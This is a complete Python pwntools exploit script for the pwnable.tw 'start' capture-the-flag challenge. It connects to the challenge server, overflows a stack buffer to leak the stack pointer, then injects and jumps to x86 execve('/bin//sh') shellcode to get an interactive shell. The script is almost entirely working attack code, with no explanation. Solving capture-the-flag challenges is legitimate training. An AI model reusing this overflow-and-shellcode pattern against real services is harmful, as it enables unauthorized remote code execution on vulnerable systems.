from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
debug = 0

if debug:
    p = process("./start")
    gdb.attach(proc.pidof(p)[0])
else:
    p = remote("chall.pwnable.tw", 10000)

p.recvuntil("Let's start the CTF:")
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload = "A" * 20 + p32(0x08048087)
p.send(payload)
esp = u32(p.recv()[:4])
payload = "A" * 20 + p32(esp + 20) + shellcode 
p.send(payload)
p.interactive()